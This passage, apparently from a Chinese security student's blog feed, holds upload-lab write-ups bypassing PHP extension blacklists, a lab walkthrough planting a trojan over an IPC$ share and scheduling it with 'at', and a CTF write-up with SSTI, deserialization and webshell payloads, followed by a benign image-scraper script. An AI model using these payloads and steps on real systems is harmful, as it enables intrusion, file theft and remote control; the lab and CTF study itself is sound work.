        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>,<span class="hljs-string">".ini"</span>);
        $file_name = trim($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);
        $file_ext = strrchr($file_name, <span class="hljs-string">'.'</span>);
        $file_ext = strtolower($file_ext); <span class="hljs-comment">//转换为小写</span>
        $file_ext = str_ireplace(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, $file_ext);<span class="hljs-comment">//去除字符串::$DATA</span>
        $file_ext = trim($file_ext); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;
            $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.$file_name;
            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;
                $is_upload = <span class="hljs-keyword">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                $msg = <span class="hljs-string">'上传出错！'</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            $msg = <span class="hljs-string">'此文件类型不允许上传！'</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        $msg = UPLOAD_PATH . <span class="hljs-string">'文件夹不存在,请手工创建！'</span>;
    &#125;
&#125;</code></pre></div>

<p>这段代码少了这句话，可以与第六关相同的做法</p>
<p><code>$file_name = deldot($file_name);//删除文件名末尾的点</code></p>
<p><img src="/2020/09/16/uploads/8.png" srcset="/img/loading.gif" alt></p>
<p><img src="/2020/09/16/uploads/8-1.png" srcset="/img/loading.gif" alt></p>
<h2 id="pass9"><a href="#pass9" class="headerlink" title="pass9"></a>pass9</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;
$msg = <span class="hljs-keyword">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>,<span class="hljs-string">".ini"</span>);
        $file_name = trim($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);
        $file_name = deldot($file_name);<span class="hljs-comment">//删除文件名末尾的点</span>
        $file_ext = strrchr($file_name, <span class="hljs-string">'.'</span>);
        $file_ext = strtolower($file_ext); <span class="hljs-comment">//转换为小写</span>
        $file_ext = trim($file_ext); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;
            $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.date(<span class="hljs-string">"YmdHis"</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).$file_ext;
            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;
                $is_upload = <span class="hljs-keyword">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                $msg = <span class="hljs-string">'上传出错！'</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            $msg = <span class="hljs-string">'此文件类型不允许上传！'</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        $msg = UPLOAD_PATH . <span class="hljs-string">'文件夹不存在,请手工创建！'</span>;
    &#125;
&#125;</code></pre></div>

<p>仔细观察发现少了这段代码</p>
<div class="hljs"><pre><code class="hljs php">$file_ext = str_ireplace(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, $file_ext);<span class="hljs-comment">//去除字符串::$DATA</span></code></pre></div>

<p> 采用Windows文件流特性绕过 </p>
<p>将文件名改为 <code>1.php::$DATA</code>,但是实质上保存的文件还是1.php</p>
<p><img src="/2020/09/16/uploads/9.png" srcset="/img/loading.gif" alt></p>
<h2 id="pass10"><a href="#pass10" class="headerlink" title="pass10"></a>pass10</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;
$msg = <span class="hljs-keyword">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>,<span class="hljs-string">".ini"</span>);
        $file_name = trim($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);
        $file_name = deldot($file_name);<span class="hljs-comment">//删除文件名末尾的点</span>
        $file_ext = strrchr($file_name, <span class="hljs-string">'.'</span>);
        $file_ext = strtolower($file_ext); <span class="hljs-comment">//转换为小写</span>
        $file_ext = str_ireplace(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, $file_ext);<span class="hljs-comment">//去除字符串::$DATA</span>
        $file_ext = trim($file_ext); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;
            $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.$file_name;
            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;
                $is_upload = <span class="hljs-keyword">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                $msg = <span class="hljs-string">'上传出错！'</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            $msg = <span class="hljs-string">'此文件类型不允许上传！'</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        $msg = UPLOAD_PATH . <span class="hljs-string">'文件夹不存在,请手工创建！'</span>;
    &#125;
&#125;</code></pre></div>

<p> 这一句代码是用来检测末尾是否是<code>.</code>，可以双写绕过。<br>抓包将文件名改为<code>1.php. .</code> （注意两点之间有空格） 前面去掉.然后检验.不存在，再去空格，留下php.，然后php.不属于$deny_ext数组中存在的，当然就直接提交了。因为windows自动去点，于是php后缀就出来了 </p>
<img src="/2020/09/16/uploads/10.png" srcset="/img/loading.gif" style="zoom:50%;">

<p><img src="/2020/09/16/uploads/10-1.png" srcset="/img/loading.gif" alt></p>
]]></content>
      <categories>
        <category>文件上传</category>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>MIME</tag>
        <tag>大小写绕过</tag>
        <tag>.htaccess</tag>
        <tag>windows文件特性</tag>
      </tags>
  </entry>
  <entry>
    <title>木马</title>
    <url>/2020/07/18/%E6%9C%A8%E9%A9%AC/</url>
    <content><![CDATA[<h1 id="初识木马"><a href="#初识木马" class="headerlink" title="初识木马"></a>初识木马</h1><a id="more"></a>
<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p><strong>使用灰鸽子软件以及端口爆破软件控制目的主机</strong></p>
<p>准备一台xp，一台2003<br>其中xp地址为10.1.1.3/24 2003为10.1.1.1/24<br>使两个主机能够通信<br>xp作为攻击方，2003为受害者</p>
<h3 id="1-制作木马"><a href="#1-制作木马" class="headerlink" title="1.制作木马"></a>1.制作木马</h3><p>使用灰鸽子制作木马，将木马生成在在桌面（记住路径之后要使用）<br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/3.png" srcset="/img/loading.gif" alt><br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/4.png" srcset="/img/loading.gif" alt></p>
<h3 id="2-扫描主机，并对账号密码进行爆破"><a href="#2-扫描主机，并对账号密码进行爆破" class="headerlink" title="2.扫描主机，并对账号密码进行爆破"></a>2.扫描主机，并对账号密码进行爆破</h3><p>ip起始地址为10.1.1.1-10.1.1.255<br>密码配置文件<br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/2.png" srcset="/img/loading.gif" alt><br>其实只要扫描10.1.1.1即可（因为是实验）</p>
<p>获取账号密码<br>username：administrator<br>password: “”</p>
<h3 id="3-与目标主机建立IPC"><a href="#3-与目标主机建立IPC" class="headerlink" title="3.与目标主机建立IPC$"></a>3.与目标主机建立IPC$</h3><p><code>net use \\10.1.1.1\ipc$ &quot;&quot; \user:administrator</code></p>
<h3 id="4-植入木马到目标主机"><a href="#4-植入木马到目标主机" class="headerlink" title="4.植入木马到目标主机"></a>4.植入木马到目标主机</h3><p><code>copy C:\Documents and Settings\shimisi\桌面\qq.exe  \\10.1.1.1\ipc$</code></p>
<h3 id="5-设置目标主机运行木马"><a href="#5-设置目标主机运行木马" class="headerlink" title="5.设置目标主机运行木马"></a>5.设置目标主机运行木马</h3><p><code>net time \\10.1.1.1</code>根据目标主机时间设置事物的开始时间<br><code>at \\10.1.1.1 17:17 c:\qq.exe</code>在上面的时间之后三分钟左右设置一个事物<br>即在17：17时运行木马文件</p>
<h3 id="6-成功控制目标主机"><a href="#6-成功控制目标主机" class="headerlink" title="6.成功控制目标主机"></a>6.成功控制目标主机</h3><p>观察目标主机已自动上线，已可以进行监控或传输数据等操作</p>
<p>获取屏幕内容<br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/5.png" srcset="/img/loading.gif" alt></p>
<p>控制命令行<br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/6.png" srcset="/img/loading.gif" alt></p>
]]></content>
      <categories>
        <category>木马</category>
      </categories>
  </entry>
  <entry>
    <title>cumt华为杯</title>
    <url>/2020/10/28/%E5%8D%8E%E4%B8%BA%E6%9D%AF/</url>
    <content><![CDATA[<h1 id="cumt-华为杯"><a href="#cumt-华为杯" class="headerlink" title="cumt_华为杯"></a>cumt_华为杯</h1><p>经典的学长虐菜局，web只做出来一个，另外两题好不容易有思路了，都被卡死了</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="doge"><a href="#doge" class="headerlink" title="doge"></a>doge</h3><p>真签到题，抽个奖就给出了flag</p>
<h3 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h3><p>刚进入页面，只有一张图片，查看源码也没发现什么</p>
<p>就是了模板注入</p>
<div class="hljs"><pre><code class="hljs angelscript">url+&#123;&#123;<span class="hljs-number">7</span>*<span class="hljs-number">7</span>&#125;&#125;Copy</code></pre></div>

<p>页面出现404报错，并且显示的是url+49，确定是模板注入</p>
<div class="hljs"><pre><code class="hljs sqf">&#123;&#123;<span class="hljs-string">''</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()&#125;&#125;
查看模块时，发现存在waf
经过测试发现是过滤了[]
于是使用
&#123;&#123;<span class="hljs-string">''</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>()&#125;&#125;
存在file模块
用read读取文件内容
<span class="hljs-built_in">exp</span>:
<span class="hljs-string">''</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>().pop(<span class="hljs-number">40</span>)(<span class="hljs-string">'/flag'</span>).read()Copy</code></pre></div>

<p>参考链接：<a href="https://xz.aliyun.com/t/8029" target="_blank" rel="noopener">https://xz.aliyun.com/t/8029</a></p>
<h3 id="VulnCMS"><a href="#VulnCMS" class="headerlink" title="VulnCMS"></a>VulnCMS</h3><p>这题是真滴无语，开始以为是XSS，后来学长提示不是，又找到了文件上传的漏洞，直接拿到了网站根目录本以为做出了，结果提示flag not here,心态炸裂，但是提示了”投个稿？“，应该是在投稿位置下功夫吧。到最后也没做出了，但是找到了漏洞代码，应该是sql注入。</p>
<p><a href="https://i.loli.net/2020/10/25/usz3grOMb56lmPG.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2020/10/25/usz3grOMb56lmPG.png" srcset="/img/loading.gif" alt="cms.png"></a></p>
<p>这里给出大神的做法</p>
<p><a href="https://i.loli.net/2020/10/25/mrLVelBfQdD28CA.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2020/10/25/mrLVelBfQdD28CA.png" srcset="/img/loading.gif" alt="cms1.png"></a></p>
<h3 id="Hodor"><a href="#Hodor" class="headerlink" title="Hodor"></a>Hodor</h3><p>这题基本上是原题，但是加了一层过滤，怎么都没绕过去。。。</p>
<p>看到WP是大S绕过，涨知识了</p>
<div class="hljs"><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
<span class="php"><span class="hljs-class"><span class="hljs-keyword">Class</span> <span class="hljs-title">Source</span> </span>&#123;</span>
<span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span> </span>&#123;</span>
<span class="php">        <span class="hljs-keyword">return</span> highlight_file(<span class="hljs-string">'license.txt'</span>, <span class="hljs-keyword">true</span>).highlight_file(<span class="hljs-keyword">$this</span>-&gt;source, <span class="hljs-keyword">true</span>);</span>
<span class="php">    &#125;</span>
<span class="php">&#125;</span>
<span class="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">easy_check</span><span class="hljs-params">($str)</span> </span>&#123;</span>
<span class="php">    <span class="hljs-comment">//echo $str;</span></span>
<span class="php">    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/flag/i"</span>, $str, $matches)) &#123;</span>
<span class="php">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span>
<span class="php">    &#125;</span>
<span class="php">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;</span>
<span class="php">&#125;</span>
<span class="php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'source'</span>]))&#123;</span>
<span class="php">    $s = <span class="hljs-keyword">new</span> Source();</span>
<span class="php">    $s-&gt;source = <span class="hljs-keyword">__FILE__</span>;</span>

<span class="php">    <span class="hljs-keyword">echo</span> $s;</span>
<span class="php">    <span class="hljs-keyword">exit</span>;</span>
<span class="php">&#125;</span>
<span class="php">$todos = [];</span>
<span class="php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">'todos'</span>]))&#123;</span>
<span class="php">    <span class="hljs-keyword">if</span>(!easy_check($_COOKIE[<span class="hljs-string">'todos'</span>])) &#123;</span>
<span class="php">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Hacker!\n"</span>;</span>
<span class="php">    &#125; <span class="hljs-keyword">else</span> &#123;</span>
<span class="php">        $c = $_COOKIE[<span class="hljs-string">'todos'</span>];</span>
<span class="php">        $h = substr($c, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);</span>
<span class="php">        $m = substr($c, <span class="hljs-number">32</span>);</span>
<span class="php">        <span class="hljs-keyword">if</span>(md5($m) === $h)&#123;</span>
<span class="php">            $todos = unserialize($m);</span>
<span class="php">        &#125;</span>
<span class="php">    &#125;</span>
<span class="php">&#125;</span>
<span class="php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'text'</span>]))&#123;</span>
<span class="php">    $todo = $_POST[<span class="hljs-string">'text'</span>];</span>

<span class="php">    $todos[] = $todo;</span>
<span class="php">    $m = serialize($todos);</span>
<span class="php">    $h = md5($m);</span>

<span class="php">    setcookie(<span class="hljs-string">'todos'</span>, $h.$m);</span>
<span class="php">    header(<span class="hljs-string">'Location: '</span>.$_SERVER[<span class="hljs-string">'REQUEST_URI'</span>]);</span>
<span class="php">    <span class="hljs-keyword">exit</span>;</span>
<span class="php">&#125;</span>
<span class="php"><span class="hljs-comment">// flag is in flag.php</span></span>
<span class="php">?Copy</span></code></pre></div>

<p>exp</p>
<div class="hljs"><pre><code class="hljs less"><span class="hljs-selector-tag">echo</span> <span class="hljs-selector-tag">md5</span>('<span class="hljs-attribute">a</span>:<span class="hljs-number">2</span>:&#123;<span class="hljs-attribute">i</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">"123"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">1</span>;<span class="hljs-attribute">O</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"Source"</span>:<span class="hljs-number">1</span>:
&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"source"</span>;<span class="hljs-attribute">S</span>:<span class="hljs-number">8</span>:<span class="hljs-string">"\66lag.php"</span>;&#125;&#125;');
<span class="hljs-selector-tag">echo</span> <span class="hljs-selector-tag">urlencode</span>('<span class="hljs-attribute">ae5860e508aaf353a9ad78ac246f46fba</span>:<span class="hljs-number">2</span>:
&#123;<span class="hljs-attribute">i</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">"123"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">1</span>;<span class="hljs-attribute">O</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"Source"</span>:<span class="hljs-number">1</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"source"</span>;<span class="hljs-attribute">S</span>:<span class="hljs-number">8</span>:<span class="hljs-string">"\66lag.php"</span>;&#125;&#125;');<span class="hljs-selector-tag">Copy</span></code></pre></div>

<p><a href="https://i.loli.net/2020/10/25/hNxGEfI5lRaevUg.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2020/10/25/hNxGEfI5lRaevUg.png" srcset="/img/loading.gif" alt="hodor.png"></a></p>
<p>参考</p>
<p><a href="https://blog.csdn.net/SmileAndFun/article/details/108497183" target="_blank" rel="noopener">https://blog.csdn.net/SmileAndFun/article/details/108497183</a></p>
<h3 id="webcms"><a href="#webcms" class="headerlink" title="webcms"></a>webcms</h3><p>是一个博客管理的网站，其实也是个原题，考察点是文件上传</p>
<p>漏洞点在图片中上传图片的位置</p>
<p><a href="https://i.loli.net/2020/10/25/qAB4ZnH23j98JaO.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2020/10/25/qAB4ZnH23j98JaO.png" srcset="/img/loading.gif" alt="webcms.png"></a></p>
<p>随便上传一张图片试试，抓包结果如下，几个注意点</p>
<p><a href="https://i.loli.net/2020/10/25/71cSPbv6KuaUl35.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2020/10/25/71cSPbv6KuaUl35.png" srcset="/img/loading.gif" alt="webcms2.png"></a></p>
<blockquote>
<p>1.filetype规定了文件的类型</p>
<p>2.上传时，将图片保存为了base64形式</p>
<p>所以上传一句话木马的时候要注意修改对应的位置</p>
</blockquote>
<p>一句话木马类型为php,则filetype改为php</p>
<p>内容为密码为cmd一句话木马，对应的base64编码<code>PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==</code></p>
<p><a href="https://i.loli.net/2020/10/25/YdaDjZmzb8KX6rc.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2020/10/25/YdaDjZmzb8KX6rc.png" srcset="/img/loading.gif" alt="webcms3.png"></a></p>
<p>上传成功，访问保存的路径：<code>http://219.219.61.234:20203/upload/tmp/1_Y2R8AK57UWV4JBW.php</code></p>
<div class="hljs"><pre><code class="hljs dockerfile">POST:
<span class="hljs-keyword">cmd</span><span class="bash">=system(<span class="hljs-string">"cat /flag"</span>);</span>
或者蚁剑连接，密码cmdCopy</code></pre></div>

<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>MIsc部分基本都是队友做的，好像也不是太难</p>
<h3 id="伪web"><a href="#伪web" class="headerlink" title="伪web"></a>伪web</h3><p>真是伪web。。。</p>
<p>直接在文件里搜索就能到flag</p>
<p>搜索关键词cmut，flag所在文件夹为html\include\include.php</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>unserialize</tag>
        <tag>ssti</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>爬图</title>
    <url>/2020/07/18/%E7%88%AC%E5%9B%BE/</url>
    <content><![CDATA[<h1 id="用爬虫爬取小姐姐的图片"><a href="#用爬虫爬取小姐姐的图片" class="headerlink" title="用爬虫爬取小姐姐的图片"></a>用爬虫爬取小姐姐的图片</h1><a id="more"></a>
<p><strong>用的库</strong></p>
<div class="hljs"><pre><code class="hljs applescript">re <span class="hljs-comment">#正则表达式</span>
requests <span class="hljs-comment">#url请求</span>
<span class="hljs-built_in">time</span>   <span class="hljs-comment">#时间</span>
os     <span class="hljs-comment">#用于创建文件夹，保存图片</span></code></pre></div>
<p>##准备工作<br>1.首先访问该链接<br><code>https://www.vmgirls.com/</code><br>2.随便点击一个进入查看详情<br><code>https://www.vmgirls.com/13344.html</code><br>3.F12审查元素网查看页详情，主要查看图片链接的标签位置，写出正则表达式<br><img src="/2020/07/18/%E7%88%AC%E5%9B%BE/picturelink.png" srcset="/img/loading.gif" alt="1"><br>该正则表达式为<code>findlinks = &#39;&lt;a href=&quot;(.*?)&quot; alt=&quot;.*?&quot; title=&quot;.*?&quot;&gt;&#39;</code></p>
<h2 id="完整程序"><a href="#完整程序" class="headerlink" title="完整程序"></a>完整程序</h2><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2020/7/16 13:36</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : tupian.py</span>
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> os

dir = <span class="hljs-string">"plmm"</span>        <span class="hljs-comment">#文件夹名字</span>
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(dir):   <span class="hljs-comment">#首先判断是否存在当前文件夹如果没有则创建一个</span>
    os.mkdir(dir)
<span class="hljs-comment"># 模仿浏览器的首部信息，绕过一些网站的反爬取措施</span>
head = &#123;
        <span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61"</span>
    &#125;

url = <span class="hljs-string">"https://www.vmgirls.com/13344.html"</span>
response = requests.get(url, headers = head)   <span class="hljs-comment"># 访问目标网页，获取网页内容</span>
html = response.text

findlinks = <span class="hljs-string">'&lt;a href="(.*?)" alt=".*?" title=".*?"&gt;'</span>
urls = re.findall(findlinks, html)   <span class="hljs-comment">#爬取到的图片链接保存在urls中， 是一个列表</span>

<span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:
    time.sleep(<span class="hljs-number">1</span>)    <span class="hljs-comment">#防止访问速度过快使服务器崩溃</span>
    file_name = url.split(<span class="hljs-string">'/'</span>)[<span class="hljs-number">-1</span>]    <span class="hljs-comment">#保存图片的名字</span>

    res = requests.get(url, headers = head)   <span class="hljs-comment">#依此访问图片链接</span>
    <span class="hljs-keyword">with</span> open(dir+<span class="hljs-string">'/'</span>+file_name, <span class="hljs-string">"wb"</span>) <span class="hljs-keyword">as</span> f:   <span class="hljs-comment">#以二进制形式保存图片</span>
        f.write(res.content)</code></pre></div>

]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>算法上机复习</title>
    <url>/2020/11/04/%E7%AE%97%E6%B3%95%E4%B8%8A%E6%9C%BA%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<p>最近算法实验要上机考试，所以还是准备一下吧(还不是因为自己太菜了)</p>
<a id="more"></a>

